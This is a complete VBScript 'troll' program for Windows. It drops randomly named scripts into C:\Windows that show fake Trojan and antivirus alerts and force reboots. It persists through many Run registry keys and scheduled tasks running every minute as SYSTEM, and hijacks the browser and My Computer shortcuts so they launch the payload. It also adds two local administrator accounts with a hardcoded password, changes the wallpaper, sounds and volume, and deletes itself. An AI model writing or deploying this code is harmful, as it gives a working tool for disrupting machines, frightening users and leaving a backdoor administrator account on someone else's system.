' Defines Custom Random  '
' Generator for filename '
' Creation.              '

' RandomString Based on http://salman-w.blogspot.com/2009/06/generate-random-strings-using.html

function RandomString()
    Randomize()

    dim CharacterSetArray
    CharacterSetArray = Array(_
		Array(3, "abcdefghijklmnopqrstuvwxyz"), _
        Array(3, "ABCDEFGHIJKLMNOPQRSTUVWXYZ"), _
        Array(2, "0123456789") _
    )
	
    dim i
    dim j
    dim Count
    dim Chars
    dim Index
    dim Temp

    for i = 0 to UBound(CharacterSetArray)
        Count = CharacterSetArray(i)(0)
        Chars = CharacterSetArray(i)(1)
        for j = 1 to Count
            Index = Int(Rnd() * Len(Chars)) + 1
            Temp = Temp & Mid(Chars, Index, 1)
        next
    next

    dim TempCopy

    do until Len(Temp) = 0
        Index = Int(Rnd() * Len(Temp)) + 1
        TempCopy = TempCopy & Mid(Temp, Index, 1)
        Temp = Mid(Temp, 1, Index - 1) & Mid(Temp, Index + 1)
    loop
    RandomString = TempCopy

end function

'========================'
'========================'
'========================'

Set objFSO=CreateObject("Scripting.FileSystemObject")

Dim file1
file1 = RandomString()

'Write Deletion Batch File'
outFile="C:\Windows\" & file1 & ".bat"
Set objFile = objFSO.CreateTextFile(outFile,True)
objFile.Write "del " & chr(34) & "%USERPROFILE%\Desktop\troll.vbs" & chr(34) & vbCrLf
objFile.Close

'========================'
'========================'
'========================'

Set objFSO=CreateObject("Scripting.FileSystemObject")

Dim file2
file2 = RandomString()

'Write Creation Batch File'
outFile="C:\Windows\" & file2 & ".bat"

'Expand userprofile path to var path
path = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%")

dirPath = path & "\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\"

If (objFSO.FolderExists(dirPath)) Then
   Set objFile = objFSO.CreateTextFile(outFile,True)
   objFile.Write "copy " & chr(34) & path & "\Desktop\Internet Explorer.lnk" & chr(34) & " " & chr(34) & dirPath & chr(34) & vbCrLf
   objFile.Write "copy " & chr(34) & path & "\Desktop\Internet Explorer.lnk" & chr(34) & " " & chr(34) & path & "\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StarMenu\" & chr(34) & vbCrLf
   objFile.Close
Else
   'File does not exist
End If

'========================'
'========================'
'========================'

Set objFSO=CreateObject("Scripting.FileSystemObject")

Dim file3
file3 = RandomString()

outFile="C:\Windows\" & file3 & ".vbs"
Set objFile = objFSO.CreateTextFile(outFile,True)
objFile.Write "x=MsgBox(" & chr(34) & "Error while Opening. Click OK to fix this issue" & chr(34) & ",0+64,"& chr(34) & "Internet Explorer"& chr(34) & ")" & vbCrLf
objFile.Write "x=MsgBox(" & chr(34) & "Something went wrong. This issue can not be resolved!" & chr(34) & ",0+48," & chr(34) & "Internet Explorer" & chr(34) & ")" & vbCrLf
objFile.Write "x=MsgBox(" & chr(34) & "A Trojan has been found on your system. Would you like Sophos to scan your system?" & chr(34) & ",3+16," & chr(34) & "Trojan Found - Win32\honeybooboo.exe" & chr(34) & ")" & vbCrLf
objFile.Write "x=MsgBox(" & chr(34) & "Access Denied, Sophos AntiVirus not found!" & chr(34) & ",2+16," & chr(34) & "Trojan Alerted" & chr(34) & ")" & vbCrLf
objFile.Write "x=MsgBox(" & chr(34) & "Copying SAM Database" & chr(34) & ",2+48," & chr(34) & "Trojan Activation Complete" & chr(34) & ")" & vbCrLf
objFile.Write "x=MsgBox(" & chr(34) & "Connected to Secure Tunnel" & chr(34) & ",2+16," & chr(34) & "Trojan Initialization Complete" & chr(34) & ")" & vbCrLf
objFile.Write "x=MsgBox(" & chr(34) & "Deleteing System32 as SYSTEM" & chr(34) & ",2+16," & chr(34) & "Trojan Self Delete Activated" & chr(34) & ")" & vbCrLf
objFile.Write "x=MsgBox(" & chr(34) & "File System deletion in progress, Click OK to prevent further system damage" & chr(34) & ",0+32," & chr(34) & "Windows Defender" & chr(34) & ")" & vbCrLf
objFile.Write "x=MsgBox(" & chr(34) & "Error: System Files deleted." & chr(34) & ",0+16," & chr(34) & "Memory Corruption Overflow" & chr(34) & ")" & vbCrLf
objFile.Write "x=MsgBox(" & chr(34) & "System will reboot in 10 seconds to prevent further damage." & chr(34) & ",0+16," & chr(34) & "Please Standby" & chr(34) & ")" & vbCrLf
objFile.Write "set WshShell = WScript.CreateObject("& chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
objFile.Write "WshShell.Run " & chr(34) & "C:\WINDOWS\system32\shutdown.exe -r -t 2" & chr(34) & vbCrLf

objFile.Close

'========================'
'========================'
'========================'

Set objFSO=CreateObject("Scripting.FileSystemObject")

Dim file4
file4 = RandomString()

volFile = "C:\WINDOWS\system32\SndVol.exe"

If (objFSO.FileExists(volFile)) Then
   volPath = "C:\WINDOWS\system32\SndVol.exe"
Else
   volPath = "C:\WINDOWS\system32\SndVol32.exe"
End If

outFile="C:\Windows\" & file4 & ".vbs"
Set objFile = objFSO.CreateTextFile(outFile,True)
objFile.Write "set WshShell = WScript.CreateObject("& chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
objFile.Write "WshShell.Run " & chr(34) & volPath & chr(34) & vbCrLf
objFile.Write "WshShell.AppActivate " & chr(34) & "Volume Control" & chr(34) & vbCrlf
objFile.Write "wscript.Sleep 1000" & vbCrlf
objFile.Write "WshShell.SendKeys " & chr(34) & "{TAB} {UP 100}" & chr(34) & vbCrlf
ObjFile.Write "wscript.Sleep 5000" & vbCrlf
ObjFile.Write "WshShell.SendKeys " & chr(34) & "%{f4}" & chr(34) & vbCrlf

objFile.Close

'========================'
'========================'
'========================'

'Set Up Shell Environment'
set WshShell = WScript.CreateObject("WScript.Shell" )

WshShell.Run "reg add " & chr(34) & "HKEY_Current_User\Software\Microsoft\CurrentVersion\Applets\SysTray" & chr(34) & " /v Services /t REG_DWORD /d 27 /f"
WshShell.Run "reg add " & chr(34) & "HKEY_Users\.Default\Software\Microsoft\CurrentVersion\Applets\SysTray" & chr(34) & " /v Services /t REG_DWORD /d 27 /f"
WshShell.Run "reg add " & chr(34) & "HKEY_Local_Machine\SOFTWARE\Microsoft\MediaPlayer\Preferences\" & chr(34) & " /v AcceptedEula /t REG_DWORD /d 00000001 /f"
WshShell.Run "reg add " & chr(34) & "HKEY_Local_Machine\SOFTWARE\Microsoft\MediaPlayer\Preferences\" & chr(34) & " /v FirstTime /t REG_DWORD /d 00000001 /f"
WshShell.Run "reg add " & chr(34) & "HKEY_Local_Machine\SOFTWARE\Policies\Microsoft\WindowsMediaPlayer" & chr(34) & " /v GroupPrivacyAcceptance /t REG_DWORD /d 00000001 /f"
WshShell.Run "reg add " & chr(34) & "HKEY_Current_User\Control Panel\Desktop" & chr(34) & " /v Wallpaper /t REG_SZ /d " & chr(34) & "%USERPROFILE%\Desktop\trollface.jpg" & chr(34) & " /f"
WshShell.Run "%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters"
WshShell.Run "reg add " & chr(34) & "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background /v OEMBackground /t REG_DWORD /d 1 /f"

'Add Reg Key to Startup'
WshShell.Run "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v " & RandomString() & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"
WshShell.Run "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run /v " & RandomString() & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"
WshShell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run  /v " & RandomString() & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"
WshShell.Run "reg add HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run /v " & RandomString() & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"
WshShell.Run "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v " & RandomString() & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"

'TEST'
WshShell.Run "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run /v TEST123*" & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"

'WshShell.Run "reg add " & chr(34) & "HKCR\Directory\Background\shell\Google Chrome" & chr(34) & " /v " & RandomString() & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"
'WshShell.Run "reg add " & chr(34) & "HKCR\Directory\Background\shell\Internet Explorer" & chr(34) & " /v " & RandomString() & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"
'WshShell.Run "reg add " & chr(34) & "HKCR\Directory\Background\shell\Windows Firewall" & chr(34) & " /v " & RandomString() & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"
'WshShell.Run "reg add " & chr(34) & "HKCR\Directory\Background\shell\Task Manager" & chr(34) & " /v " & RandomString() & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"

WshShell.Run "reg add " & chr(34) & "HKCR\Directory\Background\shell\Google Chrome" & chr(34) & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"
WshShell.Run "reg add " & chr(34) & "HKCR\Directory\Background\shell\Internet Explorer" & chr(34) & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"
WshShell.Run "reg add " & chr(34) & "HKCR\Directory\Background\shell\Windows Firewall" & chr(34) & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"
WshShell.Run "reg add " & chr(34) & "HKCR\Directory\Background\shell\Task Manager" & chr(34) & " /t REG_SZ /d C:\Windows\" & file3 & ".vbs /f"

WshShell.Run "schtasks /create /tn " & RandomString() & " /tr " & chr(34) & "%SYSTEMROOT%\" & file3 & chr(34) & ".vbs /sc ONLOGON /ru " & chr(34) & " System" & chr(34) & ""
WshShell.Run "schtasks /create /tn " & RandomString() & " /tr " & chr(34) & "%SYSTEMROOT%\" & file3 & chr(34) & ".vbs /sc MINUTE /mo 1 /ru " & chr(34) & " System" & chr(34) & ""


WshShell.Run "net user /add admin 4ppl3S4uc3!!"
WshShell.Run "net localgroup /add Administrators admin"

Dim User
User = RandomString()

WshShell.Run "net user /add " & User & " 4ppl3S4uc3!!"
WshShell.Run "net localgroup /add Administrators " & User


iePath = "C:\Program Files (x86)\Internet Explorer\"
gcPath = "C:\Program Files (x86)\Google\Chrome\Application\"

If (objFSO.FolderExists(iePath)) Then
   ieFile = "C:\Program Files (x86)\Internet Explorer\iexplore.exe"
Else
   ieFile = "C:\Program Files\Internet Explorer\iexplore.exe"
End If

'Create Internet Explorer Shortcut'
set oShellLink = WshShell.CreateShortcut("Internet Explorer.lnk")
oShellLink.Description = "Internet Explorer"
oShellLink.TargetPath = "C:\Windows\" & file3 & ".vbs"
oShellLink.IconLocation = ieFile
oShellLink.WindowStyle = 1
oShellLink.Save

If (objFSO.FolderExists(gcPath)) Then
   gcFile = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
Else
   gcFile = "C:\Program Files\Google\Chrome\Application\chrome.exe"
End If

'Create Google Chrome Shortcut'
set oShellLink = WshShell.CreateShortcut("Google Chrome.lnk")
oShellLink.Description = "Google Chrome"
oShellLink.TargetPath = "C:\Windows\" & file3 & ".vbs"
oShellLink.IconLocation = gcFile
oShellLink.WindowStyle = 1
oShellLink.Save

'Create My Computer Shortcut'
set oShellLink = WshShell.CreateShortcut("My Computer.lnk")
oShellLink.Description = "My Computer"
oShellLink.TargetPath = "C:\Windows\" & file3 & ".vbs"
oShellLink.IconLocation = "C:\WINDOWS\Explorer.exe"
oShellLink.WindowStyle = 1
oShellLink.Save

'========================'
'========================'
'========================'

Set objFSO=CreateObject("Scripting.FileSystemObject")

Dim file5
file5 = RandomString()

outFile="C:\Windows\" & file5 & ".vbs"
Set objFile = objFSO.CreateTextFile(outFile,True)

objFile.Write "set WshShell = WScript.CreateObject("& chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
objFile.Write "music = " & chr(34) & "%USERPROFILE%\Desktop\rick.wav" & chr(34) & "" & vbCrLf
ObjFile.Write "WshShell.Run " & chr(34) & "wmplayer " & chr(34) & chr(34) & chr(34) & " & music & " & chr(34) & chr(34) & chr(34) & chr(34) & ",0,True" & vbCrLf

objFile.Close

'========================'
'========================'
'========================'

Set objFSO=CreateObject("Scripting.FileSystemObject")

Dim file6
file6 = RandomString()

'Write Creation Batch File'
outFile="C:\Windows\" & file6 & ".bat"
Set objFile = objFSO.CreateTextFile(outFile,True)

objFile.Write "copy " & chr(34) & "%USERPROFILE%\Desktop\troll.vbs" & chr(34) & " " & chr(34) & "%USERPROFILE%\AppData\Roaming\Microsoft\Internet Explorer\" & chr(34) & vbCrLf

objFile.Close

'========================'
'========================'
'========================'

'Set Up Shell Environment'
'set WshShell = WScript.CreateObject("WScript.Shell" )

'WshShell.Run "reg add " & chr(34) & "HKEY_Current_User\Software\Microsoft\CurrentVersion\Applets\SysTray" & chr(34) & " /v Services /t REG_DWORD /d 27 /f"
'WshShell.Run "reg add " & chr(34) & "HKEY_Users\.Default\Software\Microsoft\CurrentVersion\Applets\SysTray" & chr(34) & " /v Services /t REG_DWORD /d 27 /f"
'WshShell.Run "reg add " & chr(34) & "HKEY_Local_Machine\SOFTWARE\Microsoft\MediaPlayer\Preferences\" & chr(34) & " /v AcceptedEula /t REG_DWORD /d 00000001 /f"
'WshShell.Run "reg add " & chr(34) & "HKEY_Local_Machine\SOFTWARE\Microsoft\MediaPlayer\Preferences\" & chr(34) & " /v FirstTime /t REG_DWORD /d 00000001 /f"
'WshShell.Run "reg add " & chr(34) & "HKEY_Local_Machine\SOFTWARE\Policies\Microsoft\WindowsMediaPlayer" & chr(34) & " /v GroupPrivacyAcceptance /t REG_DWORD /d 00000001 /f"
'WshShell.Run "reg add " & chr(34) & "HKEY_Current_User\Control Panel\Desktop" & chr(34) & " /v Wallpaper /t REG_SZ /d " & chr(34) & "%USERPROFILE%\Desktop\trollface.jpg" & chr(34) & " /f"
'WshShell.Run "%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters"
'WshShell.Run "reg add " & chr(34) & "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background /v OEMBackground /t REG_DWORD /d 1 /f"

'========================'
'========================'
'========================'

soundFile = "C:\Windows\Media\Windows Shutdown.wav"
path = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%")

If (objFSO.FileExists(soundFile)) Then
    shutSound = path & "\Desktop\Windows Shutdown.wav"
    logoSound = path & "\Desktop\Windows Logoff Sound.wav"

    WshShell.Run "cmd.exe /C copy /Y " & shutSound & "C:\Windows\Media\Windows Shutdown.wav"
    WshShell.Run "cmd.exe /C copy /Y " & logoSound & "C:\Windows\Media\Windows Logoff Sound.wav"
Else
    shutSound = path & "\Desktop\Windows XP Shutdown.wav"
    logoSound = path & "\Desktop\Windows XP Logoff Sound.wav"

    WshShell.Run "cmd.exe /C copy /Y " & shutSound & "C:\Windows\Media\Windows XP Shutdown.wav"
    WshShell.Run "cmd.exe /C copy /Y " & logoSound & "C:\Windows\Media\Windows XP Logoff Sound.wav"
End If

'========================'
'========================'
'========================'

'Delete File from Desktop'
'WshShell.Run "C:\Windows\" & file2 & ".bat"
WshShell.Run "C:\Windows\" & file4 & ".vbs"
wscript.Sleep 1000
WshShell.Run "C:\Windows\" & file5 & ".vbs"
WshShell.Run "C:\Windows\" & file6 & ".bat"
WshShell.Run "C:\Windows\" & file1 & ".bat"
